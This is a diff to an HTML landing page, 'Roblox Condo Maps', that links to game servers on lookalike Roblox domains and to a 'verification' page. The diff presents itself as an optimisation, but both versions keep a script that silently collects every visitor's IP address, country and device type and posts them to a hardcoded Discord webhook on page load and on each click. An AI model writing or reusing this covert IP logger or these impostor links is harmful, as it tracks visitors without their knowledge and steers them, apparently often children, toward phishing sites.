@@ -4,13 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Condo Maps</title>
-    <link href="https://fonts.googleapis.com/css2?family=Agbalumo&display=swap" rel="stylesheet">
+    
+    <!-- Conexão antecipada para maior velocidade -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://ipapi.co">
+    
+    <!-- Carregamento de fonte otimizado -->
+    <link href="https://fonts.googleapis.com/css2?family=Agbalumo&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: system-ui, sans-serif;
+            font-family: system-ui, -apple-system, sans-serif;
             background-color: #000;
-            background-image: url('https://i.ibb.co/VchTqG8m/background.jpg'); 
+            /* Background otimizado com sobreposição direta */
+            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://i.ibb.co/VchTqG8m/background.jpg'); 
             background-size: cover;
             background-position: center;
             background-attachment: fixed;
@@ -18,18 +27,12 @@
             display: flex;
             align-items: center;
             justify-content: center;
-        }
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 1;
+            overflow-x: hidden;
         }
         .content { position: relative; z-index: 2; text-align: center; width: 100%; max-width: 500px; padding: 20px; }
         .title {
-            font-family: 'Agbalumo', cursive;
-            font-size: 3rem;
+            font-family: 'Agbalumo', cursive, system-ui;
+            font-size: clamp(2rem, 10vw, 3rem);
             color: #fff;
             margin-bottom: 30px;
             text-shadow: 0 0 15px #AD00FF;
@@ -42,41 +45,57 @@
             border: 2px solid #AD00FF;
             background: rgba(0, 0, 0, 0.8);
             border-radius: 10px;
-            font-family: 'Agbalumo', cursive;
+            font-family: 'Agbalumo', cursive, system-ui;
             font-size: 1.8rem;
             text-decoration: none;
-            transition: 0.3s;
+            transition: transform 0.2s ease, background 0.2s;
             cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
         }
-        .btn:hover {
-            transform: scale(1.05);
-            background: rgba(173, 0, 255, 0.2);
-            color: #fff;
+        @media (hover: hover) {
+            .btn:hover {
+                transform: scale(1.03);
+                background: rgba(173, 0, 255, 0.2);
+                color: #fff;
+            }
         }
-        .footer { color: #fff; margin-top: 30px; opacity: 0.7; letter-spacing: 2px; }
+        .btn:active { transform: scale(0.98); }
+        .footer { color: #fff; margin-top: 30px; opacity: 0.7; letter-spacing: 2px; font-size: 0.9rem; }
     </style>
 </head>
 <body>
-    <div class="content">
+    <main class="content">
         <h1 class="title">Roblox Condo Maps</h1>
-        <div class="buttons">
-            <a data-url="https://roblox.mq/games/94641939467366/Fun-combat-game?privateServerLinkCode=95905670998612346299377288403761" class="btn">⚔️ 𝑭𝒖𝒏–𝑪𝒐𝒎𝒃𝒂𝒕</a>
-            <a data-url="https://roblox.com.ge/games/135584994052780/AI-Talk-With-Neko?privateServerLinkCode=40996480944674634315323368510113" class="btn">😼🔥 𝗦𝗨𝗦 𝗡𝗘𝗞𝗢</a>
-            <a data-url="https://www.roblox.tc/games/102072656821218/UPD-3YOUR-NEKO-FRIEND?privateServerLinkCode=23314189966922803139351524206900" class="btn">🔥 Ｎ 𝐄 Ｋ  𝐎   Ｈ 𝐎 ３</a>
-            <a data-url="https://restorecord.com/pt/verify/Verify%20in%20CONDO%20ROBLOX%F0%9F%92%9C" class="btn">・𝒗𝒆𝒓𝒊𝒇𝒊𝒄𝒂𝒕𝒊𝒐𝒏</a>
-            <a data-url="https://roblox.com.ge/games/90908715811812/Find-the-Neko-Girl-Join-for-a-surprise?privateServerLinkCode=40996480944674634315323368510113" class="btn">❤ 𝟏𝟎𝟎 𝐏𝐋𝐀𝐘𝐄𝐑𝐒</a>
-        </div>
-        <p class="footer">CONDO ROBLOX</p>
-    </div>
+        <nav class="buttons">
+            <a href="https://roblox.mq/games/94641939467366/Fun-combat-game?privateServerLinkCode=95905670998612346299377288403761" class="btn" target="_blank" rel="noopener noreferrer">⚔️ 𝑭𝒖𝒏–𝑪𝒐𝒎𝒃𝒂𝒕</a>
+            <a href="https://roblox.com.ge/games/135584994052780/AI-Talk-With-Neko?privateServerLinkCode=40996480944674634315323368510113" class="btn" target="_blank" rel="noopener noreferrer">😼🔥 𝗦𝗨𝗦 𝗡𝗘𝗞𝗢</a>
+            <a href="https://www.roblox.tc/games/102072656821218/UPD-3YOUR-NEKO-FRIEND?privateServerLinkCode=23314189966922803139351524206900" class="btn" target="_blank" rel="noopener noreferrer">🔥 Ｎ 𝐄 Ｋ  𝐎   Ｈ 𝐎 ３</a>
+            <a href="https://restorecord.com/pt/verify/Verify%20in%20CONDO%20ROBLOX%F0%9F%92%9C" class="btn" target="_blank" rel="noopener noreferrer">・𝒗𝒆𝒓𝒊𝒇𝒊𝒄𝒂𝒕𝒊𝒐𝒏</a>
+            <a href="https://roblox.com.ge/games/90908715811812/Find-the-Neko-Girl-Join-for-a-surprise?privateServerLinkCode=40996480944674634315323368510113" class="btn" target="_blank" rel="noopener noreferrer">❤ 𝟏𝟎𝟎 𝐏𝐋𝐀𝐘𝐄𝐑𝐒</a>
+        </nav>
+        <footer class="footer">CONDO ROBLOX</footer>
+    </main>
 
     <script>
-        const webhook = 'https://discord.com/api/webhooks/1471212703069769748/JG-CqEqsiege-0h0of63QHRiK-j0kwOPrlThSzAs481mTQkXHPO90Hi9ec1KPxBudI1-';
+        (function() {
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1471212703069769748/JG-CqEqsiege-0h0of63QHRiK-j0kwOPrlThSzAs481mTQkXHPO90Hi9ec1KPxBudI1-';
+            let ipDataCache = null;
 
-        async function log(tipo, nome = '') {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                const info = `📍 **País:** ${data.country_name} | 📱 **Disp:** ${navigator.userAgent.includes('Mobi') ? 'Celular' : 'PC'} | 🌐 **IP:** ${data.ip}`;
+            async function getIpInfo() {
+                if (ipDataCache) return ipDataCache;
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipDataCache = await res.json();
+                    return ipDataCache;
+                } catch (e) {
+                    return { country_name: 'Desconhecido', ip: '0.0.0.0' };
+                }
+            }
+
+            async function sendLog(tipo, nome = '') {
+                const data = await getIpInfo();
+                const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+                const info = `📍 **País:** ${data.country_name} | 📱 **Disp:** ${isMobile ? 'Celular' : 'PC'} | 🌐 **IP:** ${data.ip}`;
                 
                 const payload = {
                     username: "Monitor",
@@ -85,24 +104,22 @@
                         description: tipo === 'visita' ? "Alguém entrou no site!" : `Clicou em: **${nome}**`,
                         fields: [{ name: "Info", value: info }],
                         color: tipo === 'visita' ? 0x3498DB : 0xAD00FF,
-                        timestamp: new Date()
+                        timestamp: new Date().toISOString()
                     }]
                 };
 
-                await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true });
-            } catch (e) {}
-        }
+                fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }).catch(() => {});
+            }
 
-        window.onload = () => log('visita');
+            window.addEventListener('load', () => sendLog('visita'), { once: true });
 
-        document.querySelectorAll('.btn').forEach(b => {
-            b.onclick = (e) => {
-                e.preventDefault();
-                const url = b.getAttribute('data-url');
-                log('clique', b.innerText);
-                setTimeout(() => window.open(url, '_blank'), 400);
-            };
-        });
+            document.querySelector('.buttons').addEventListener('click', (e) => {
+                const btn = e.target.closest('.btn');
+                if (btn) {
+                    sendLog('clique', btn.innerText.trim());
+                }
+            });
+        })();
     </script>
 </body>
 </html>
